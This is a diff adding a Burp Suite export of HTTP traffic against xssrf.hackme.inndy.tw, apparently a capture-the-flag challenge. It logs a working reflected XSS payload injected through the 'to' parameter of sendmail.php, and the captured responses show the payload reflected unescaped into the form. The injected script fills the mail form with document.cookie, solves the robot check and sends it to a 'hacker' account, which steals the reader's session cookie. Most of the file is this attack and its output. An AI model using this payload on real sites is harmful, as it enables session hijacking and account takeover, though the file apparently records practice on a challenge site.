@@ -1,0 +1,375 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="1.7.35" exportTime="Fri Nov 30 17:35:58 CST 2018">
+  <item>
+    <time>Fri Nov 30 17:34:45 CST 2018</time>
+    <url><![CDATA[https://xssrf.hackme.inndy.tw/sendmail.php?to="><script>setTimeout(function(){document.getElementById("to_user").setAttribute("value","hacker");document.getElementById("subject").setAttribute("value",document.cookie);document.getElementById("content").setAttribute("value","cookie");im_robot.click();document.getElementsByTagName("form")[0].setAttribute("method","POST");},3000);</script><"]]></url>
+    <host ip="140.118.126.236">xssrf.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/sendmail.php?to="><script>setTimeout(function(){document.getElementById("to_user").setAttribute("value","hacker");document.getElementById("subject").setAttribute("value",document.cookie);document.getElementById("content").setAttribute("value","cookie");im_robot.click();document.getElementsByTagName("form")[0].setAttribute("method","POST");},3000);</script><"]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[GET /sendmail.php?to="><script>setTimeout(function(){document.getElementById("to_user").setAttribute("value","hacker");document.getElementById("subject").setAttribute("value",document.cookie);document.getElementById("content").setAttribute("value","cookie");im_robot.click();document.getElementsByTagName("form")[0].setAttribute("method","POST");},3000);</script><" HTTP/1.1
+Host: xssrf.hackme.inndy.tw
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=bu2lhn67r7olo8oulcskno8oj6
+
+]]></request>
+    <status>200</status>
+    <responselength>4644</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 30 Nov 2018 09:34:45 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 4337
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSSRF - Send Mail</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="style.css" media="all">
+    <style>code.keyword { border: 1px solid #333; padding: 0 2px; margin: 0 2px; border-radius: 3px; white-space: pre; }</style>
+  </head>
+  <body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XSSRF</a>
+
+  <ul class="navbar-nav">
+    <li class="nav-item">
+      <a class="nav-link" href="sendmail.php">Send Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="mailbox.php">Mailbox</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="sentmail.php">Sent Mail</a>
+    </li>
+  </ul>
+
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item">
+      <span class="navbar-text">Hello, abcde (User)</span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="logout.php">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+    <div class="container">
+      <form action="/sendmail.php?to="><script>setTimeout(function(){document.getElementById("to_user").setAttribute("value","hacker");document.getElementById("subject").setAttribute("value",document.cookie);document.getElementById("content").setAttribute("value","cookie");im_robot.click();document.getElementsByTagName("form")[0].setAttribute("method","POST");},3000);</script><"" method="POST">
+        <div class="form-group">
+          <label for="to_user">Receiver</label>
+          <input type="text" name="to_user" class="form-control" id="to_user" aria-describedby="to_user" placeholder="Receiver" value="&quot;&gt;&lt;script&gt;setTimeout&lpar;function&lpar;&rpar;&lbrace;document&period;getElementById&lpar;&quot;to&lowbar;user&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;&quot;hacker&quot;&rpar;&semi;document&period;getElementById&lpar;&quot;subject&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;document&period;cookie&rpar;&semi;document&period;getElementById&lpar;&quot;content&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;&quot;cookie&quot;&rpar;&semi;im&lowbar;robot&period;click&lpar;&rpar;&semi;document&period;getElementsByTagName&lpar;&quot;form&quot;&rpar;&lbrack;0&rsqb;&period;setAttribute&lpar;&quot;method&quot;&comma;&quot;POST&quot;&rpar;&semi;&rcub;&comma;3000&rpar;&semi;&lt;&sol;script&gt;&lt;&quot;">
+          <small class="form-text text-muted">Username of receiver</small>
+        </div>
+
+        <div class="form-group">
+          <label for="subject">Subject</label>
+          <input type="text" name="subject" class="form-control" id="subject" aria-describedby="subject" placeholder="Subject" value="">
+        </div>
+
+        <div class="form-group">
+          <label for="content">Content</label>
+          <textarea id="content" name="content" class="form-control" cols="30" rows="10" placeholder="Content"></textarea>
+        </div>
+
+        <div class="form-group">
+          <label for="im_robot">Robot Check</label>
+          <div class="input-group">
+            <div class="input-group-prepend">
+              <span class="input-group-text"><code>/* You are not admin */ md5("154ebed62d10f546" + "</code></span>
+            </div>
+            <input type="text" class="form-control" name="proof_of_work" id="proof_of_work">
+            <div class="input-group-append">
+              <span class="input-group-text"><code>").substr(0, 5) === "00000"</code></span>
+              <button id="im_robot" class="btn btn-info">I'm a robot</button>
+            </div>
+          </div>
+        </div>
+
+        <button class="btn btn-primary">Send</button>
+      </form>
+    </div>
+
+    <script src="md5.js"></script>
+    <script>
+      im_robot.onclick = function (e) {
+        if(proof_of_work.value.length === 0) {
+          var hardness = 5;
+          var leading_zero = '00000000000000000000000000000000'.substr(0, hardness);
+          for(var i = 0; i < 0x10000000; i++) {
+            var hash = md5('154ebed62d10f546' + i.toString());
+            if(hash.substr(0, hardness) === leading_zero) {
+              proof_of_work.value = i;
+              break;
+            }
+          }
+        }
+        return false;
+      }
+    </script>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Nov 30 17:35:23 CST 2018</time>
+    <url><![CDATA[https://xssrf.hackme.inndy.tw/read.php?id=3172]]></url>
+    <host ip="140.118.126.236">xssrf.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/read.php?id=3172]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[GET /read.php?id=3172 HTTP/1.1
+Host: xssrf.hackme.inndy.tw
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=v856lctnosh8q1l22m7ngpke13
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+    <status>200</status>
+    <responselength>2020</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 30 Nov 2018 09:35:23 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1713
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSSRF - Readmail</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="style.css" media="all">
+    <style>
+      .hide-read .read { display: none; }
+      .hide-unread .unread { display: none; }
+      .checks { margin-bottom: 1rem; }
+      .checks .form-check { display: inline-block; padding-right: 1rem; }
+      .card-text { white-space: pre; }
+    </style>
+  </head>
+  <body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XSSRF</a>
+
+  <ul class="navbar-nav">
+    <li class="nav-item">
+      <a class="nav-link" href="sendmail.php">Send Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="mailbox.php">Mailbox</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="sentmail.php">Sent Mail</a>
+    </li>
+  </ul>
+
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item">
+      <span class="navbar-text">Hello, abcde (User)</span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="logout.php">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+    <div class="container">
+
+      <div class="card text-white bg-dark">
+        <div class="card-body">
+          <h2 class="card-title">
+            Welcome&excl;          </h2>
+          <h4>From: <a href="sendmail.php?to=admin">admin</a></h4>
+          <div class="card-text"><p>Hi,</p><p>I am admin from this website, I will read all your mails but never reply.</p><p><img src="imgs/corgi-2.jpg"></p><p></p><p>Sincerely, Site Admin John-Doe</p></div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Fri Nov 30 17:35:26 CST 2018</time>
+    <url><![CDATA[https://xssrf.hackme.inndy.tw/sendmail.php?to=%22%3E%3Cscript%3EsetTimeout(function(){document.getElementById(%22to_user%22).setAttribute(%22value%22,%22hacker%22);document.getElementById(%22subject%22).setAttribute(%22value%22,document.cookie);document.getElementById(%22content%22).setAttribute(%22value%22,%22cookie%22);im_robot.click();document.getElementsByTagName(%22form%22)[0].setAttribute(%22method%22,%22POST%22);},3000);%3C/script%3E%3C%22]]></url>
+    <host ip="140.118.126.236">xssrf.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/sendmail.php?to=%22%3E%3Cscript%3EsetTimeout(function(){document.getElementById(%22to_user%22).setAttribute(%22value%22,%22hacker%22);document.getElementById(%22subject%22).setAttribute(%22value%22,document.cookie);document.getElementById(%22content%22).setAttribute(%22value%22,%22cookie%22);im_robot.click();document.getElementsByTagName(%22form%22)[0].setAttribute(%22method%22,%22POST%22);},3000);%3C/script%3E%3C%22]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[GET /sendmail.php?to=%22%3E%3Cscript%3EsetTimeout(function(){document.getElementById(%22to_user%22).setAttribute(%22value%22,%22hacker%22);document.getElementById(%22subject%22).setAttribute(%22value%22,document.cookie);document.getElementById(%22content%22).setAttribute(%22value%22,%22cookie%22);im_robot.click();document.getElementsByTagName(%22form%22)[0].setAttribute(%22method%22,%22POST%22);},3000);%3C/script%3E%3C%22 HTTP/1.1
+Host: xssrf.hackme.inndy.tw
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://xssrf.hackme.inndy.tw/read.php?id=3172
+Connection: close
+Cookie: PHPSESSID=v856lctnosh8q1l22m7ngpke13
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+    <status>200</status>
+    <responselength>4704</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 30 Nov 2018 09:35:26 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 4397
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>XSSRF - Send Mail</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" media="all">
+    <link rel="stylesheet" href="style.css" media="all">
+    <style>code.keyword { border: 1px solid #333; padding: 0 2px; margin: 0 2px; border-radius: 3px; white-space: pre; }</style>
+  </head>
+  <body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
+  <a class="navbar-brand" href="index.php">XSSRF</a>
+
+  <ul class="navbar-nav">
+    <li class="nav-item">
+      <a class="nav-link" href="sendmail.php">Send Mail</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="mailbox.php">Mailbox</a>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="sentmail.php">Sent Mail</a>
+    </li>
+  </ul>
+
+  <ul class="navbar-nav ml-auto">
+    <li class="nav-item">
+      <span class="navbar-text">Hello, abcde (User)</span>
+    </li>
+    <li class="nav-item">
+      <a class="nav-link" href="logout.php">Logout</a>
+    </li>
+  </ul>
+</nav>
+
+    <div class="container">
+      <form action="/sendmail.php?to=%22%3E%3Cscript%3EsetTimeout(function(){document.getElementById(%22to_user%22).setAttribute(%22value%22,%22hacker%22);document.getElementById(%22subject%22).setAttribute(%22value%22,document.cookie);document.getElementById(%22content%22).setAttribute(%22value%22,%22cookie%22);im_robot.click();document.getElementsByTagName(%22form%22)[0].setAttribute(%22method%22,%22POST%22);},3000);%3C/script%3E%3C%22" method="POST">
+        <div class="form-group">
+          <label for="to_user">Receiver</label>
+          <input type="text" name="to_user" class="form-control" id="to_user" aria-describedby="to_user" placeholder="Receiver" value="&quot;&gt;&lt;script&gt;setTimeout&lpar;function&lpar;&rpar;&lbrace;document&period;getElementById&lpar;&quot;to&lowbar;user&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;&quot;hacker&quot;&rpar;&semi;document&period;getElementById&lpar;&quot;subject&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;document&period;cookie&rpar;&semi;document&period;getElementById&lpar;&quot;content&quot;&rpar;&period;setAttribute&lpar;&quot;value&quot;&comma;&quot;cookie&quot;&rpar;&semi;im&lowbar;robot&period;click&lpar;&rpar;&semi;document&period;getElementsByTagName&lpar;&quot;form&quot;&rpar;&lbrack;0&rsqb;&period;setAttribute&lpar;&quot;method&quot;&comma;&quot;POST&quot;&rpar;&semi;&rcub;&comma;3000&rpar;&semi;&lt;&sol;script&gt;&lt;&quot;">
+          <small class="form-text text-muted">Username of receiver</small>
+        </div>
+
+        <div class="form-group">
+          <label for="subject">Subject</label>
+          <input type="text" name="subject" class="form-control" id="subject" aria-describedby="subject" placeholder="Subject" value="">
+        </div>
+
+        <div class="form-group">
+          <label for="content">Content</label>
+          <textarea id="content" name="content" class="form-control" cols="30" rows="10" placeholder="Content"></textarea>
+        </div>
+
+        <div class="form-group">
+          <label for="im_robot">Robot Check</label>
+          <div class="input-group">
+            <div class="input-group-prepend">
+              <span class="input-group-text"><code>/* You are not admin */ md5("e19d14d5d4a0bbe6" + "</code></span>
+            </div>
+            <input type="text" class="form-control" name="proof_of_work" id="proof_of_work">
+            <div class="input-group-append">
+              <span class="input-group-text"><code>").substr(0, 5) === "00000"</code></span>
+              <button id="im_robot" class="btn btn-info">I'm a robot</button>
+            </div>
+          </div>
+        </div>
+
+        <button class="btn btn-primary">Send</button>
+      </form>
+    </div>
+
+    <script src="md5.js"></script>
+    <script>
+      im_robot.onclick = function (e) {
+        if(proof_of_work.value.length === 0) {
+          var hardness = 5;
+          var leading_zero = '00000000000000000000000000000000'.substr(0, hardness);
+          for(var i = 0; i < 0x10000000; i++) {
+            var hash = md5('e19d14d5d4a0bbe6' + i.toString());
+            if(hash.substr(0, hardness) === leading_zero) {
+              proof_of_work.value = i;
+              break;
+            }
+          }
+        }
+        return false;
+      }
+    </script>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+</items>
